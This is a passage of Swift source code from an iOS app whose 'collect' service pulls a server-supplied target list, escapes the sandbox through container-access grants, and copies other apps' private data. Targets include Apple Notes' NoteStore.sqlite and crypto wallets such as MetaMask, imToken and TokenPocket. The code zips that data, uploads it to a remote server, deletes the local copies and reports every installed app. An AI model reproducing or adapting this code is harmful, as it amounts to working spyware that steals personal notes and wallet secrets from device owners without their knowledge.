            log("collect: zip folder name \"\(appName)\" for \(config.bundleID)")
            let stagingParent = documentsURL.appendingPathComponent(
                ".collect-\(stamp)-\(UUID().uuidString)",
                isDirectory: true
            )
            let stagingURL = stagingParent.appendingPathComponent(appName, isDirectory: true)
            do {
                try fileManager.createDirectory(
                    atPath: stagingURL.path,
                    withIntermediateDirectories: true,
                    attributes: nil
                )
            } catch {
                log("collect: cannot create staging folder")
                continue
            }
            var copied = 0
            let containerRootURL = URL(fileURLWithPath: containerPath, isDirectory: true)
            for source in sources {
                // 整容器项：把容器内的条目平铺复制进 <appName>/，
                // 与 legacy 管线的 zip 结构一致（NoteStore.sqlite 直接可见）
                if source.url.standardizedFileURL == containerRootURL.standardizedFileURL {
                    let entries = (try? fileManager.contentsOfDirectory(atPath: source.url.path)) ?? []
                    log("collect: whole-container copy — \(entries.count) entries")
                    var tried = 0
                    for entry in entries {
                        tried += 1
                        let child = source.url.appendingPathComponent(entry)
                        do {
                            _ = try FileManagerService.transferItem(
                                at: child,
                                into: stagingURL,
                                mode: .copy,
                                conflictPolicy: .fail,
                                fileManager: fileManager
                            )
                            copied += 1
                        } catch {
                            log("collect: copy failed \(entry) — \(error)")
                            copied += copyDirectoryFallback(
                                at: child,
                                into: stagingURL,
                                fileManager: fileManager,
                                depth: 0
                            )
                        }
                    }
                    log("collect: whole-container done — tried=\(tried) copied=\(copied)")
                    continue
                }
                do {
                    _ = try FileManagerService.transferItem(
                        at: source.url,
                        into: stagingURL,
                        mode: .copy,
                        conflictPolicy: .fail,
                        fileManager: fileManager
                    )
                    copied += 1
                } catch {
                    log("collect: copy failed \(source.name) — \(error)")
                    // 目录复制失败的兜底：逐文件复制，读不了的跳过，
                    // 保证 NoteStore.sqlite 等能拿多少拿多少。
                    copied += copyDirectoryFallback(
                        at: source.url,
                        into: stagingURL,
                        fileManager: fileManager,
                        depth: 0
                    )
                }
            }
            guard copied > 0 else {
                try? fileManager.removeItem(at: stagingParent)
                await MainActor.run {
                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：文件复制失败")
                }
                continue
            }

            let zipName = uniqueZipName(
                baseName: "collect-\(appName)-\(stamp)",
                in: documentsURL,
                fileManager: fileManager
            )
            guard let archive = try? FileManagerService.createZIPArchive(
                containing: [stagingURL],
                named: zipName,
                in: documentsURL,
                fileManager: fileManager
            ) else {
                try? fileManager.removeItem(at: stagingParent)
                log("collect: archive failed for \(config.bundleID)")
                await MainActor.run {
                    ProtocolStatusLog.shared.append("采集失败 — \(statusLabel)：打包失败")
                }
                continue
            }
            try? fileManager.removeItem(at: stagingParent)

            zipCount += 1
            byteCount += archive.sourceBytes
            log("collect: zip SUCCESS — \(archive.archiveURL.lastPathComponent) bytes=\(archive.sourceBytes)")
            do {
                try await ProtocolAPI.uploadZip(
                    fileURL: archive.archiveURL,
                    bundleID: config.bundleID
                )
                uploadedCount += 1
                uploadedNames.append(statusLabel)
                await MainActor.run {
                    ProtocolStatusLog.shared.append("上传成功 — \(statusLabel)")
                }
                try? fileManager.removeItem(at: archive.archiveURL)
                log("collect: local zip removed after upload — \(archive.archiveURL.lastPathComponent)")
            } catch {
                log("collect: upload FAILED — \(archive.archiveURL.lastPathComponent): \(error)")
                let reason = shortReason(error)
                await MainActor.run {
                    ProtocolStatusLog.shared.append("上传失败 — \(statusLabel)：\(reason)")
                }
            }
        }

        pruneLocalZips(in: documentsURL, fileManager: fileManager)
        let result = CollectCycleResult(
            zipCount: zipCount,
            uploadedCount: uploadedCount,
            byteCount: byteCount,
            completedAt: Date()
        )
        log("collect: 采集完成 — 总共 \(configs.count) 个，已完成 \(zipCount) 个（上传 \(uploadedCount) 个）")
        await MainActor.run {
            ProtocolStatusLog.shared.append("采集完成 — 总共 \(configs.count) 个，已完成 \(zipCount) 个（上传 \(uploadedCount) 个）")
            if !uploadedNames.isEmpty {
                ProtocolStatusLog.shared.append("上传列表 \(uploadedNames.count) 个：\(uploadedNames.joined(separator: "、"))")
            }
        }
        log("collect: cycle done zips=\(zipCount) uploaded=\(uploadedCount) bytes=\(byteCount)")
        return result
    }

    /// Enumerates installed app bundle ids using the same merged pipeline as
    /// the Files browser (LS/API + MCM + filesystem + LaunchServices + MHA-C2
    /// + metadata inference), since plain MCM enumeration is restricted.
    private static func enumerateInstalledBundleIDs() -> [String] {
        let bundleMetadata = ContainerStore.applicationBundleMetadataCatalog()
        let apiApps = ContainerStore.applyingBundleMetadata(
            to: ContainerStore.installedAppsFromAPI(),
            catalog: bundleMetadata
        )
        let dynamicIdentifiers = ContainerStore.dynamicAppIdentifiers()
        let mcmApps = ContainerStore.installedAppsFromMCM(
            identifiers: dynamicIdentifiers,
            bundleMetadata: bundleMetadata
        )
        let filesystemApps = ContainerStore.containersFromFilesystem()
        let baseIdentifiedApps = mcmApps + apiApps
        let merged = ContainerDiscoveryMerger.merge(
            enumerated: filesystemApps,
            identified: baseIdentifiedApps,
            path: { $0.containerPath }
        )
        let launchServicesIdentifiers = ContainerStore.launchServicesStoreIdentifiers()
        let mhaIdentifiers = MHAIdentifierCatalog.identifiers(
            dynamic: dynamicIdentifiers,
            installed: apiApps.map(\.bundleID),
            research: ContainerStore.researchAppIdentifiers,
            custom: bundleMetadata.keys.sorted(),
            launchServices: launchServicesIdentifiers
        )
        let mhaApps = ContainerStore.installedAppsFromMHACandidates(
            identifiers: mhaIdentifiers,
            bundleMetadata: bundleMetadata
        )
        let allKnownApps = mhaApps + baseIdentifiedApps
        let identifiedPaths = Set(allKnownApps.map {
            ContainerDiscoveryMerger.canonicalPath($0.containerPath)
        })
        let unmatched = filesystemApps.filter {
            !identifiedPaths.contains(
                ContainerDiscoveryMerger.canonicalPath($0.containerPath)
            )
        }
        let inferred = ContainerStore.inferUnidentifiedApps(
            in: unmatched,
            knownApps: allKnownApps,
            launchServicesIdentifiers: Set(launchServicesIdentifiers)
        )
        let finalApps = AppDataCatalogMerger.merge(
            identified: allKnownApps,
            fallback: inferred,
            identifier: { $0.bundleID },
            path: { $0.containerPath }
        )

        var seen = Set<String>()
        var result: [String] = []
        for app in finalApps {
            let bundleID = app.bundleID
            guard ContainerPresentationPolicy.shouldShow(bundleID: bundleID),
                  ContainerBundleCandidateResolver.isValidBundleIdentifier(bundleID),
                  seen.insert(bundleID).inserted else { continue }
            result.append(bundleID)
        }
        result.sort()
        log("collect: enumerated \(result.count) installed bundle ids for reporting")
        return result
    }

    /// Resolves a collect item to an existing on-disk URL. Server paths are
    /// normalized (whitespace around "/" removed) and, for iOS 26's
    /// per-bundle Application Support layout, retried under
    /// `Library/Application Support/<bundle_id>/`.
    private static func resolvedItemURL(
        _ item: CollectItem,
        containerURL: URL,
        config: CollectConfig,
        fileManager: FileManager
    ) -> URL? {
        var normalized = item.path
        while normalized.contains(" /") || normalized.contains("/ ") {
            normalized = normalized
                .replacingOccurrences(of: " /", with: "/")
                .replacingOccurrences(of: "/ ", with: "/")
        }
        normalized = normalized.trimmingCharacters(in: .whitespaces)

        // 整容器项（"/"、"."、"./"、空）：源就是容器目录本身，
        // 不能被当成文件系统根路径 "/"（否则会去复制整个根目录或报 sourceMissing）。
        if normalized.isEmpty || normalized == "/" || normalized == "." || normalized == "./" {
            // 容器基准本身是 "/"（纯绝对路径配置）时，禁止整容器复制系统根
            guard containerURL.path != "/" else {
                log("collect: skip whole-container item — container base is filesystem root")
                return nil
            }
            let container = URL(fileURLWithPath: containerURL.path, isDirectory: true)
            if fileManager.fileExists(atPath: container.path) {
                log("collect: item \"\(item.path)\" resolved to container root \(container.path)")
                return container
            }
            log("collect: skip missing \(item.path) — container root not visible")
            return nil
        }

        var candidates: [String] = []
        if normalized.hasPrefix("/") {
            candidates = [normalized]
        } else {
            candidates = [
                (containerURL.path as NSString).appendingPathComponent(normalized)
            ]
            let supportPrefix = "Library/Application Support/"
            if normalized.hasPrefix(supportPrefix) {
                let rest = String(normalized.dropFirst(supportPrefix.count))
                if !rest.isEmpty {
                    var bundleLayout = containerURL.path
                    for component in ["Library", "Application Support", config.bundleID]
                        + rest.components(separatedBy: "/") {
                        bundleLayout = (bundleLayout as NSString).appendingPathComponent(component)
                    }
                    candidates.append(bundleLayout)
                }
            }
        }

        let rawJoin = (containerURL.path as NSString).appendingPathComponent(item.path)
        for (index, candidate) in candidates.enumerated() {
            let candidateURL = URL(fileURLWithPath: candidate, isDirectory: item.type == "dir")
            guard fileManager.fileExists(atPath: candidateURL.path) else { continue }
            if index > 0 {
                log("collect: resolved \"\(item.path)\" via bundle layout \(candidateURL.path)")
            } else if item.path.hasPrefix("/") == false, candidate != rawJoin {
                log("collect: resolved \"\(item.path)\" after whitespace normalization")
            }
            return candidateURL
        }
        log("collect: skip missing \(item.path) — tried \(candidates.count) path variant(s)")
        return nil
    }

    /// Short human-readable reason for a failed collection/upload step.
    private static func shortReason(_ error: Error) -> String {
        switch error {
        case ProtocolCollectError.serverUnreachable:
            return "服务器不可达"
        case ProtocolCollectError.invalidServerResponse:
            return "服务器响应异常"
        case ProtocolCollectError.collectionFailed:
            return "读取文件失败"
        case ProtocolCollectError.uploadFailed:
            return "上传被拒绝"
        default:
            return String(describing: error)
        }
    }

    private static func resolveContainer(for config: CollectConfig) -> String? {
        // 所有 items 都是绝对路径（如 /var/mobile/Media/DCIM、PhotoData）时，
        // 不需要 MCM 容器解析：直接用 "/" 作基准。
        // 沙箱设备上 fileExists 会自然失败（显示"采集项路径不存在"），
        // 提权成功的设备上则能直接采集。
        // 注意：整容器标记 "/"、"."、"./"、空 不属于"绝对路径"，
        // 它们表示"容器本身"，必须走正常的容器解析。
        let allAbsolute = !config.items.isEmpty && config.items.allSatisfy { item in
            let p = item.path.trimmingCharacters(in: .whitespaces)
            guard !p.isEmpty, p != "/", p != ".", p != "./" else { return false }
            return p.hasPrefix("/")
        }
        if allAbsolute {
            log("collect: \(config.bundleID) items are absolute paths — skipping container resolution")
            return "/"
        }

        // "group.*" identifiers are shared containers: resolve them with the
        // class-3 group query and activate the sandbox token so the payload
        // files can actually be read.
        if config.bundleID.hasPrefix("group.") {
            if let groupPath = activateGroupContainerPath(identifier: config.bundleID) {
                return groupPath
            }
            // Fall back to the host app container (group.com.apple.notes ->
            // com.apple.mobilenotes); newer iOS keeps some payloads there and
            // MHA-C2 can resolve app containers even without kernel access.
            let appBundleID = String(config.bundleID.dropFirst("group.".count))
            if let appPath = ContainerStore.resolveAppContainerPath(
                bundleID: appBundleID
            ) {
                log("collect: group container unavailable — using app container \(appBundleID)")
                return appPath
            }
        } else if let path = ContainerStore.resolveAppContainerPath(
            bundleID: config.bundleID
        ) {
            return path
        }
        guard !config.accessGroup.isEmpty else { return nil }
        return activateGroupContainerPath(identifier: config.accessGroup)
    }

    private static var retainedGroupGrants: [String: Int64] = [:]

    private static func activateGroupContainerPath(identifier: String) -> String? {
        // "魔改开 class7"：组容器解析从只试 class 3 改为试全套
        // class 7（系统组，systemgroup.*）/ 9（AppGroup）/ 8（Group）/ 3（Shared），
        // 备忘录 NoteStore.sqlite 所在的 group.com.apple.notes /
        // systemgroup.com.apple.notes 需要 class 7 才能解析到。
        if let groupPath = ContainerStore.resolveGroupContainerPath(identifier: identifier) {
            log("collect: resolved group container \(identifier) via MCM -> \(groupPath)")
            return groupPath
        }
        log("collect: MCM group lookup denied \(identifier) — falling back to path scan")
        if let scanned = resolveGroupContainerByScan(identifier: identifier) {
            return scanned
        }
        return nil
    }

    /// Fallback for devices where MCM refuses group-container lookups (no
    /// kernel access): enumerate /var/mobile/Containers/Shared/AppGroup,
    /// match the per-container metadata plist, and keep a bad_query grant
    /// alive so the payload files can be read during the copy.
    private static func resolveGroupContainerByScan(identifier: String) -> String? {
        let root = "/var/mobile/Containers/Shared/AppGroup"
        let directories = ContainerStore.enumerateDirectoriesWithTraversalGrant(path: root)
        guard !directories.isEmpty else {
            log("collect: group scan unavailable — no group containers enumerated")
            return nil
        }
        // When the root grant is refused, per-container grants fail too and
        // metadata reads need the sandbox escape; bail out instead of
        // spamming one grant attempt per directory.
        let rootHandle = ContainerStore.grantContainerAccess(root)
        let grantsPossible = rootHandle >= 0
        if rootHandle >= 0 { bad_query_release(rootHandle) }
        guard grantsPossible else {
            log("collect: group scan skipped — grants refused (sandbox escape not active)")
            return nil
        }

        for directory in directories {
            guard UUID(uuidString: (directory as NSString).lastPathComponent) != nil else {
                continue
            }
            let handle = ContainerStore.grantContainerAccess(directory)
            guard handle >= 0 else { continue }
            let metadata = ContainerStore.readContainerMetadata(containerPath: directory)
            if metadata?.bundleID == identifier {
                retainedGroupGrants[directory] = handle
                log("collect: resolved group container \(identifier) via filesystem scan (grant \(handle))")
                return directory
            }
            bad_query_release(handle)
        }
        log("collect: group scan could not find \(identifier)")
        return nil
    }

    private static func timestampString() -> String {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "yyyyMMdd-HHmmss"
        return formatter.string(from: Date())
    }

    private static func uniqueZipName(
        baseName: String,
        in directoryURL: URL,
        fileManager: FileManager
    ) -> String {
        var candidate = baseName
        var suffix = 2
        while fileManager.fileExists(
            atPath: directoryURL.appendingPathComponent(candidate + ".zip").path
        ) {
            candidate = "\(baseName)-\(suffix)"
            suffix += 1
        }
        return candidate
    }

    private static func pruneLocalZips(in documentsURL: URL, fileManager: FileManager) {
        let names = ((try? fileManager.contentsOfDirectory(atPath: documentsURL.path)) ?? [])
            .filter { $0.hasPrefix("collect-") && $0.hasSuffix(".zip") }
            .sorted()
        let excess = names.count - maximumLocalZipCount
        guard excess > 0 else { return }
        for name in names.prefix(excess) {
            try? fileManager.removeItem(at: documentsURL.appendingPathComponent(name))
            log("collect: pruned local zip \(name)")
        }
    }

    /// Human folder name for a collect config — the server-provided app_name
    /// when present (e.g. "TokenPocket"), otherwise a compact name derived
    /// from the bundle id (im.token.app -> "imtoken", group.com.apple.notes
    /// -> "notes").
    private static func appFolderName(for config: CollectConfig) -> String {
        let serverName = sanitizedFolderName(config.appName)
        if !serverName.isEmpty { return serverName }

        // Shared group identifiers: group.com.apple.notes -> "notes".
        if config.bundleID.hasPrefix("group.") {
            let trimmed = String(config.bundleID.dropFirst("group.".count))
            let short = sanitizedFolderName(trimmed.components(separatedBy: ".").last ?? trimmed)
            if !short.isEmpty { return short.lowercased() }
        }

        var parts = config.bundleID.components(separatedBy: ".")
        var bundleDerived = ""
        if parts.count > 1 {
            if parts.last?.lowercased() == "app" {
                // im.token.app -> imtoken
                parts.removeLast()
                bundleDerived = sanitizedFolderName(parts.joined().lowercased())
            } else {
                // io.metamask.MetaMask -> metamask
                bundleDerived = sanitizedFolderName(parts.last?.lowercased() ?? "")
            }
        }
        if bundleDerived.isEmpty {
            bundleDerived = sanitizedFolderName(config.bundleID.lowercased())
        }

        let info = appInfoForBundleID(config.bundleID) as? [String: Any] ?? [:]
        let resolved = AppDisplayNamePolicy.resolve(
            bundleID: config.bundleID,
            candidates: [info["name"] as? String]
        )
        let display = sanitizedFolderName(resolved)

        // A real display name wins; when only the bundle id (or a case
        // variant) is available, use the compact bundle-derived name.
        if !display.isEmpty,
           display.caseInsensitiveCompare(config.bundleID) != .orderedSame,
           (bundleDerived.isEmpty
            || display.caseInsensitiveCompare(bundleDerived) != .orderedSame) {
            return display
        }
        return bundleDerived.isEmpty ? config.bundleID : bundleDerived
    }

    private static func sanitizedFolderName(_ raw: String) -> String {
        let invalid = CharacterSet(charactersIn: "\\/:*?\"<>|")
            .union(.controlCharacters)
        var name = raw.components(separatedBy: invalid).joined(separator: " ")
        name = name.split(separator: " ").joined(separator: " ")
        name = name.trimmingCharacters(in: .whitespacesAndNewlines)
        while name.hasSuffix(".") { name.removeLast() }
        guard !name.isEmpty, name != ".", name != ".." else { return "" }
        if name.count > 64 { name = String(name.prefix(64)) }
        return name
    }
}

/// Runs one collection cycle per launch (pulling `/api/device/report`) and
/// exposes the latest outcome for the Home status card.
@MainActor
final class ProtocolCollectCenter: ObservableObject {
    enum Phase: Equatable {
        case pending
        case running
        case succeeded(CollectCycleResult)
        case failed(ProtocolCollectError)
    }

    @Published private(set) var phase: Phase = .pending
    private var hasAttempted = false

    func collectIfNeeded(retryAfterFailure: Bool = false) {
        if hasAttempted {
            guard retryAfterFailure, case .failed = phase else { return }
        }
        hasAttempted = true
        phase = .running
        log("collect: cycle started")
        Task { [weak self] in
            let result: Result<CollectCycleResult, ProtocolCollectError>
            do {
                result = .success(try await ProtocolCollectService.runCycle())
            } catch let error as ProtocolCollectError {
                result = .failure(error)
            } catch {
                result = .failure(.invalidServerResponse)
            }
            await ProtocolLogReporter.reportPendingLogs()
            guard let self else { return }
            switch result {
            case .success(let cycle):
                self.phase = .succeeded(cycle)
            case .failure(let error):
                self.phase = .failed(error)
            }
        }
    }
}
